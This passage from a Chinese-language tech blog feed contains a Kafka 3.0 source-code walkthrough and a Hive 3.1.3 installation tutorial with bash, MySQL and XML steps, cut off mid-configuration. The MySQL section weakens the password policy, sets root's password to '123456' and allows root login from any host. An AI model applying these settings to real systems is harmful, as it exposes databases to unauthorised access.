(!updateAssignmentMetadataIfNeeded(time.timer(Long.MAX_VALUE), <span class="keyword">true</span>)) &#123;</span><br><span class="line">                  log.warn(<span class="string">"Still waiting for metadata"</span>);</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// 2 抓取数据</span></span><br><span class="line">          <span class="keyword">final</span> Map&lt;TopicPartition, List&lt;ConsumerRecord&lt;K, V&gt;&gt;&gt; records = pollForFetches(timer);</span><br><span class="line">          <span class="keyword">if</span> (!records.isEmpty()) &#123;</span><br><span class="line">              <span class="comment">// before returning the fetched records, we can send off the next round of fetches</span></span><br><span class="line">              <span class="comment">// and avoid block waiting for their responses to enable pipelining while the user</span></span><br><span class="line">              <span class="comment">// is handling the fetched records.</span></span><br><span class="line">              <span class="comment">//</span></span><br><span class="line">              <span class="comment">// <span class="doctag">NOTE:</span> since the consumed position has already been updated, we must not allow</span></span><br><span class="line">              <span class="comment">// wakeups or any other errors to be triggered prior to returning the fetched records.</span></span><br><span class="line">              <span class="keyword">if</span> (fetcher.sendFetches() &gt; <span class="number">0</span> || client.hasPendingRequests()) &#123;</span><br><span class="line">                  client.transmitSends();</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="comment">// 3 拦截器处理数据</span></span><br><span class="line">              <span class="keyword">return</span> <span class="keyword">this</span>.interceptors.onConsume(<span class="keyword">new</span> ConsumerRecords&lt;&gt;(records));</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; <span class="keyword">while</span> (timer.notExpired());</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> ConsumerRecords.empty();</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      release();</span><br><span class="line">      <span class="keyword">this</span>.kafkaConsumerMetrics.recordPollEnd(timer.currentTimeMs());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-2-消费者-消费者组初始化">3.2 消费者/消费者组初始化</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">poll</span><span class="params">(Timer timer, <span class="keyword">boolean</span> waitForJoinGroup)</span> </span>&#123;</span><br><span class="line">    maybeUpdateSubscriptionMetadata();</span><br><span class="line"></span><br><span class="line">    invokeCompletedOffsetCommitCallbacks();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (subscriptions.hasAutoAssignedPartitions()) &#123;</span><br><span class="line">        <span class="comment">// 如果没有指定分区分配策略  直接抛异常</span></span><br><span class="line">        <span class="keyword">if</span> (protocol == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"User configured "</span> + ConsumerConfig.PARTITION_ASSIGNMENT_STRATEGY_CONFIG +</span><br><span class="line">                <span class="string">" to empty while trying to subscribe for group protocol to auto assign partitions"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Always update the heartbeat last poll time so that the heartbeat thread does not leave the</span></span><br><span class="line">        <span class="comment">// group proactively due to application inactivity even if (say) the coordinator cannot be found.</span></span><br><span class="line">        <span class="comment">// 3s心跳</span></span><br><span class="line">        pollHeartbeat(timer.currentTimeMs());</span><br><span class="line">        <span class="comment">// 判断Coordinator 是否准备好了</span></span><br><span class="line">        <span class="keyword">if</span> (coordinatorUnknown() &amp;&amp; !ensureCoordinatorReady(timer)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line">    maybeAutoCommitOffsetsAsync(timer.currentTimeMs());</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-3-拉取数据">3.3 拉取数据</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Map&lt;TopicPartition, List&lt;ConsumerRecord&lt;K, V&gt;&gt;&gt; pollForFetches(Timer timer) &#123;</span><br><span class="line">    <span class="keyword">long</span> pollTimeout = coordinator == <span class="keyword">null</span> ? timer.remainingMs() :</span><br><span class="line">            Math.min(coordinator.timeToNextPoll(timer.currentTimeMs()), timer.remainingMs());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if data is available already, return it immediately</span></span><br><span class="line">    <span class="comment">// 第一次拉取不到数据</span></span><br><span class="line">    <span class="keyword">final</span> Map&lt;TopicPartition, List&lt;ConsumerRecord&lt;K, V&gt;&gt;&gt; records = fetcher.fetchedRecords();</span><br><span class="line">    <span class="keyword">if</span> (!records.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> records;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// send any new fetches (won't resend pending fetches)</span></span><br><span class="line">    <span class="comment">// 开始拉取数据,里面放了一个监听函数，</span></span><br><span class="line">    fetcher.sendFetches();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// We do not want to be stuck blocking in poll if we are missing some positions</span></span><br><span class="line">    <span class="comment">// since the offset lookup may be backing off after a failure</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// <span class="doctag">NOTE:</span> the use of cachedSubscriptionHashAllFetchPositions means we MUST call</span></span><br><span class="line">    <span class="comment">// updateAssignmentMetadataIfNeeded before this method.</span></span><br><span class="line">    <span class="keyword">if</span> (!cachedSubscriptionHashAllFetchPositions &amp;&amp; pollTimeout &gt; retryBackoffMs) &#123;</span><br><span class="line">        pollTimeout = retryBackoffMs;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log.trace(<span class="string">"Polling for fetches with timeout &#123;&#125;"</span>, pollTimeout);</span><br><span class="line"></span><br><span class="line">    Timer pollTimer = time.timer(pollTimeout);</span><br><span class="line">    client.poll(pollTimer, () -&gt; &#123;</span><br><span class="line">        <span class="comment">// since a fetch might be completed by the background thread, we need this poll condition</span></span><br><span class="line">        <span class="comment">// to ensure that we do not block unnecessarily in poll()</span></span><br><span class="line">        <span class="keyword">return</span> !fetcher.hasAvailableFetches();</span><br><span class="line">    &#125;);</span><br><span class="line">    timer.update(pollTimer.currentTimeMs());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> fetcher.fetchedRecords();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 首先抓取数据为空，然后发送请求监听并将数据放入队列，最后再抓取数据，拦截器处理数据</span></span><br></pre></td></tr></table></figure><h3 id="3-4-消费者-Offset-提交">3.4 消费者 Offset 提交</h3><p><img src="http://qnypic.shawncoding.top/blog/202401251335155.png" alt></p><h1>三、服务端源码</h1><p>生产者消费者源码使用java编写，而服务端源码使用scala编写</p><p><img src="http://qnypic.shawncoding.top/blog/202401251335156.png" alt></p><p>程序入口在core→src→main→scala→Kafka→kafka.scala</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 获取相关参数</span></span><br><span class="line">    <span class="keyword">val</span> serverProps = getPropsFromArgs(args)</span><br><span class="line">    <span class="comment">// 创建服务</span></span><br><span class="line">    <span class="keyword">val</span> server = buildServer(serverProps)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="type">OperatingSystem</span>.<span class="type">IS_WINDOWS</span> &amp;&amp; !<span class="type">Java</span>.isIbmJdk)</span><br><span class="line">        <span class="keyword">new</span> <span class="type">LoggingSignalHandler</span>().register()</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">      <span class="keyword">case</span> e: <span class="type">ReflectiveOperationException</span> =&gt;</span><br><span class="line">        warn(<span class="string">"Failed to register optional signal handler that logs a message when the process is terminated "</span> +</span><br><span class="line">          <span class="string">s"by a signal. Reason for registration failure is: <span class="subst">$e</span>"</span>, e)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// attach shutdown handler to catch terminating signals as well as normal termination</span></span><br><span class="line">    <span class="type">Exit</span>.addShutdownHook(<span class="string">"kafka-shutdown-hook"</span>, &#123;</span><br><span class="line">      <span class="keyword">try</span> server.shutdown()</span><br><span class="line">      <span class="keyword">catch</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> _: <span class="type">Throwable</span> =&gt;</span><br><span class="line">          fatal(<span class="string">"Halting Kafka."</span>)</span><br><span class="line">          <span class="comment">// Calling exit() can lead to deadlock as exit() can be called multiple times. Force exit.</span></span><br><span class="line">          <span class="type">Exit</span>.halt(<span class="number">1</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 启动服务</span></span><br><span class="line">    <span class="keyword">try</span> server.startup()</span><br><span class="line">    <span class="keyword">catch</span> &#123;</span><br><span class="line">      <span class="keyword">case</span> _: <span class="type">Throwable</span> =&gt;</span><br><span class="line">        <span class="comment">// KafkaServer.startup() calls shutdown() in case of exceptions, so we invoke `exit` to set the status code</span></span><br><span class="line">        fatal(<span class="string">"Exiting Kafka."</span>)</span><br><span class="line">        <span class="type">Exit</span>.exit(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server.awaitShutdown()</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> e: <span class="type">Throwable</span> =&gt;</span><br><span class="line">      fatal(<span class="string">"Exiting Kafka due to fatal exception"</span>, e)</span><br><span class="line">      <span class="type">Exit</span>.exit(<span class="number">1</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">Exit</span>.exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1&gt;Kafka3.0源码学习&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;kafka官网：&lt;a href=&quot;https://kafka.apache.org/downloads&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; title=&quot;https://kafka.apache.org/downloads&quot;&gt;https://kafka.apache.org/downloads&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;一、生产者源码&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;http://qnypic.shawncoding.top/blog/202401251335148.png&quot; alt&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>Hive3.1.3基础学习</title>
    <link href="https://blog.shawncoding.top/posts/6de6e6d0.html"/>
    <id>https://blog.shawncoding.top/posts/6de6e6d0.html</id>
    <published>2024-02-06T07:04:02.000Z</published>
    <updated>2024-02-29T12:00:08.273Z</updated>
    
    <content type="html"><![CDATA[<h1>一、Hive入门与安装</h1><h2 id="1、Hive入门">1、Hive入门</h2><h3 id="1-1-简介">1.1 简介</h3><blockquote><p>Hive是由Facebook开源，基于Hadoop的一个数据仓库工具，可以将结构化的数据文件映射为一张表，并提供类SQL查询功能</p></blockquote><p>Hive是一个Hadoop客户端，用于将HQL（Hive SQL）转化成MapReduce程序</p><ul><li>Hive中每张表的数据存储在HDFS</li><li>Hive分析数据底层的实现是MapReduce（也可配置为Spark或者Tez） </li><li>执行程序运行在Yarn上</li></ul><a id="more"></a><h3 id="1-2-Hive架构原理">1.2 Hive架构原理</h3><p><img src="http://qnypic.shawncoding.top/blog/202401251334387.png" alt></p><p><strong>用户接口：Client</strong></p><p>JDBC的移植性比ODBC好；（通常情况下，安装完ODBC驱动程序之后，还需要经过确定的配置才能够应用。而不相同的配置在不相同数据库服务器之间不能够通用。所以，安装一次就需要再配置一次。JDBC只需要选取适当的JDBC数据库驱动程序，就不需要额外的配置。在安装过程中，JDBC数据库驱动程序会自己完成有关的配置。）两者使用的语言不同，JDBC在Java编程时使用，ODBC一般在C/C++编程时使用</p><p><strong>元数据：Metastore</strong></p><p>元数据包括：数据库（默认是default）、表名、表的拥有者、列/分区字段、表的类型（是否是外部表）、表的数据所在目录等。默认存储在自带的derby数据库中，由于derby数据库只支持单客户端访问，生产环境中为了多人开发，推荐使用MySQL存储Metastore</p><p><strong>驱动器：Driver</strong></p><ul><li>解析器（SQLParser）：将SQL字符串转换成抽象语法树（AST）</li><li>语义分析（Semantic Analyzer）：将AST进一步划分为QeuryBlock</li><li>逻辑计划生成器（Logical Plan Gen）：将语法树生成逻辑计划</li><li>逻辑优化器（Logical Optimizer）：对逻辑计划进行优化</li><li>物理计划生成器（Physical Plan Gen）：根据优化后的逻辑计划生成物理计划</li><li>物理优化器（Physical Optimizer）：对物理计划进行优化</li><li>执行器（Execution）：执行该计划，得到查询结果并返回给客户端</li></ul><p><img src="http://qnypic.shawncoding.top/blog/202401251334388.png" alt></p><h2 id="2、Hive安装">2、Hive安装</h2><h3 id="2-1-安装地址">2.1 安装地址</h3><p>Hive<strong>官网地址</strong>：<a href="http://hive.apache.org/" target="_blank" rel="noopener" title="http://hive.apache.org/">http://hive.apache.org/</a></p><p>文档查看地址：<a href="https://cwiki.apache.org/confluence/display/Hive/GettingStarted" target="_blank" rel="noopener" title="https://cwiki.apache.org/confluence/display/Hive/GettingStarted">https://cwiki.apache.org/confluence/display/Hive/GettingStarted</a></p><p>下载地址：<a href="http://archive.apache.org/dist/hive/" target="_blank" rel="noopener" title="http://archive.apache.org/dist/hive/">http://archive.apache.org/dist/hive/</a></p><p><strong>github</strong>地址：<a href="https://github.com/apache/hive" target="_blank" rel="noopener" title="https://github.com/apache/hive">https://github.com/apache/hive</a></p><h3 id="2-2-Hive最小化安装-测试用">2.2 Hive最小化安装(测试用)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本文章前请先学习hadoop</span></span><br><span class="line"><span class="comment"># myhadoop.sh start 首先开启集群hadoop</span></span><br><span class="line"><span class="comment"># jpsall</span></span><br><span class="line">wget http://archive.apache.org/dist/hive/hive-3.1.3/apache-hive-3.1.3-bin.tar.gz</span><br><span class="line"><span class="comment"># 解压apache-hive-3.1.3-bin.tar.gz到/opt/module/目录下面</span></span><br><span class="line">tar -zxvf apache-hive-3.1.3-bin.tar.gz -C /opt/module/</span><br><span class="line"><span class="built_in">cd</span> /opt/module/</span><br><span class="line">mv /opt/module/apache-hive-3.1.3-bin/ /opt/module/hive</span><br><span class="line"><span class="comment"># 修改/etc/profile.d/my_env.sh，添加环境变量</span></span><br><span class="line">sudo vim /etc/profile.d/my_env.sh</span><br><span class="line"><span class="comment">#HIVE_HOME</span></span><br><span class="line"><span class="built_in">export</span> HIVE_HOME=/opt/module/hive</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$HIVE_HOME</span>/bin</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /etc/profile.d/my_env.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化元数据库（默认是derby数据库）</span></span><br><span class="line">bin/schematool -dbType derby -initSchema</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里启动可能会报错这是因为hadoop和hive的两个guava.jar版本不一致</span></span><br><span class="line"><span class="comment"># 需要将hadoop的高版本guava来代替hive中的jar包</span></span><br><span class="line">mv lib/guava-19.0.jar lib/guava-19.0.jar.bak</span><br><span class="line">cp /opt/ha/hadoop-3.1.3/share/hadoop/common/lib/guava-27.0-jre.jar /opt/module/hive/lib/guava-27.0-jre.jar</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动Hive，只能使用命令行</span></span><br><span class="line">bin/hive</span><br><span class="line"><span class="comment"># 使用Hive</span></span><br><span class="line">hive&gt; show databases;</span><br><span class="line">hive&gt; show tables;</span><br><span class="line">hive&gt; create table stu(id int, name string);</span><br><span class="line">hive&gt; insert into stu values(1,<span class="string">"ss"</span>);</span><br><span class="line">hive&gt; select * from stu;</span><br><span class="line"><span class="comment"># Hive中的表在Hadoop中是目录；Hive中的数据在Hadoop中是文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在Xshell窗口中开启另一个窗口开启Hive，在/tmp/atguigu目录下监控hive.log文件</span></span><br><span class="line">tail -f hive.log</span><br><span class="line"><span class="comment"># 原因在于Hive默认使用的元数据库为derby。derby数据库的特点是同一时间只允许一个客户端访问。如果多个Hive客户端同时访问，就会报错</span></span><br><span class="line"><span class="comment"># 我们可以将Hive的元数据改为用MySQL存储，MySQL支持多客户端同时访问</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先退出hive客户端。然后在Hive的安装目录下将derby.log和metastore_db删除，顺便将HDFS上目录删除</span></span><br><span class="line">hive&gt; quit;</span><br><span class="line">rm -rf derby.log metastore_db</span><br><span class="line"><span class="comment"># 删除HDFS中/user/hive/warehouse/stu中数据</span></span><br><span class="line">hadoop fs -rm -r /user</span><br></pre></td></tr></table></figure><h3 id="2-3-MySQL安装">2.3 MySQL安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载mysql,离线安装</span></span><br><span class="line">wget https://downloads.mysql.com/archives/get/p/23/file/mysql-5.7.28-1.el7.x86_64.rpm-bundle.tar</span><br><span class="line"><span class="comment"># 解压MySQL安装包</span></span><br><span class="line">mkdir /opt/software/mysql_lib</span><br><span class="line">tar -xf mysql-5.7.28-1.el7.x86_64.rpm-bundle.tar -C /opt/software/mysql_lib</span><br><span class="line"><span class="comment"># 卸载系统自带的mariadb</span></span><br><span class="line">sudo rpm -qa | grep mariadb | xargs sudo rpm -e --nodeps</span><br><span class="line"><span class="comment"># 安装MySQL依赖</span></span><br><span class="line"><span class="built_in">cd</span> mysql_lib</span><br><span class="line">sudo rpm -ivh mysql-community-common-5.7.28-1.el7.x86_64.rpm</span><br><span class="line">sudo rpm -ivh mysql-community-libs-5.7.28-1.el7.x86_64.rpm</span><br><span class="line">sudo rpm -ivh mysql-community-libs-compat-5.7.28-1.el7.x86_64.rpm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装mysql-client</span></span><br><span class="line">sudo rpm -ivh mysql-community-client-5.7.28-1.el7.x86_64.rpm</span><br><span class="line"><span class="comment"># 安装mysql-server</span></span><br><span class="line">sudo rpm -ivh mysql-community-server-5.7.28-1.el7.x86_64.rpm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 若出现以下错误sudo yum -y install libaio</span></span><br><span class="line"><span class="comment"># 启动MySQL</span></span><br><span class="line">sudo systemctl start mysqld</span><br><span class="line"><span class="comment"># 查看MySQL密码</span></span><br><span class="line">sudo cat /var/<span class="built_in">log</span>/mysqld.log | grep password</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =====================配置MySQL=======================</span></span><br><span class="line"><span class="comment"># 配置主要是root用户 + 密码，在任何主机上都能登录MySQL数据库</span></span><br><span class="line">mysql -uroot -p<span class="string">'password'</span></span><br><span class="line"><span class="comment"># 设置复杂密码（由于MySQL密码策略，此密码必须足够复杂）</span></span><br><span class="line">mysql&gt; <span class="built_in">set</span> password=password(<span class="string">"Qs23=zs32"</span>);</span><br><span class="line"><span class="comment"># 更改MySQL密码策略</span></span><br><span class="line">mysql&gt; <span class="built_in">set</span> global validate_password_policy=0;</span><br><span class="line">mysql&gt; <span class="built_in">set</span> global validate_password_length=4;</span><br><span class="line"><span class="comment"># 设置简单好记的密码</span></span><br><span class="line"><span class="built_in">set</span> password=password(<span class="string">"123456"</span>);</span><br><span class="line"><span class="comment"># 进入MySQL库</span></span><br><span class="line">use mysql</span><br><span class="line"><span class="comment"># 查询user表</span></span><br><span class="line">select user, host from user;</span><br><span class="line"><span class="comment"># 修改user表，把Host表内容修改为%</span></span><br><span class="line">update user <span class="built_in">set</span> host=<span class="string">"%"</span> <span class="built_in">where</span> user=<span class="string">"root"</span>;</span><br><span class="line">flush privileges;</span><br><span class="line">quit;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里有个数据库建模软件很好用：http://www.ezdml.com/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ========================卸载MySQL说明===================</span></span><br><span class="line"><span class="comment"># 若因为安装失败或者其他原因，MySQL需要卸载重装</span></span><br><span class="line"><span class="comment"># 通过/etc/my.cnf查看MySQL数据的存储位置</span></span><br><span class="line">sudo cat /etc/my.cnf</span><br><span class="line"><span class="comment"># 去往/var/lib/mysql路径需要root权限</span></span><br><span class="line"><span class="built_in">cd</span> /var/lib/mysql</span><br><span class="line">rm -rf * </span><br><span class="line"><span class="comment"># 卸载MySQL相关包</span></span><br><span class="line">sudo rpm -qa | grep -i -E mysql</span><br><span class="line">rpm -qa | grep -i -E mysql\|mariadb | xargs -n1 sudo rpm -e --nodeps</span><br></pre></td></tr></table></figure><h3 id="2-4-配置Hive元数据存储到MySQL">2.4 配置Hive元数据存储到MySQL</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 新建Hive元数据库</span></span><br><span class="line">mysql -uroot -p123456</span><br><span class="line">mysql&gt; create database metastore;</span><br><span class="line">mysql&gt; quit;</span><br><span class="line"><span class="comment"># 将MySQL的JDBC驱动拷贝到Hive的lib目录下,驱动自行下载</span></span><br><span class="line">cp /opt/software/mysql-connector-java-5.1.37.jar <span class="variable">$HIVE_HOME</span>/lib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解决日志Jar包冲突，进入/opt/module/hive/lib目录</span></span><br><span class="line">mv log4j-slf4j-impl-2.10.0.jar log4j-slf4j-impl-2.10.0.jar.bak</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在$HIVE_HOME/conf目录下新建hive-site.xml文件</span></span><br><span class="line">vim <span class="variable">$HIVE_HOME</span>/conf/hive-site.xml</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改元数据库字符集</span></span><br><span class="line"><span class="comment"># Hive元数据库的字符集默认为Latin1，由于其不支持中文字符，故若建表语句中包含中文注释，会出现乱码现象</span></span><br><span class="line"><span class="comment"># 修改Hive元数据库中存储注释的字段的字符集为utf-8，进入metastore库，jdbc也要变成utf-8</span></span><br><span class="line"><span class="comment"># 字段注释</span></span><br><span class="line">alter table COLUMNS_V2 modify column COMMENT varchar(256) character <span class="built_in">set</span> utf8;</span><br><span class="line"><span class="comment"># 表注释</span></span><br><span class="line">alter table TABLE_PARAMS modify column PARAM_VALUE mediumtext character <span class="built_in">set</span> utf8;</span><br></pre></td></tr></table></figure><p>添加如下内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- jdbc连接的URL，连接也要申明utf-8 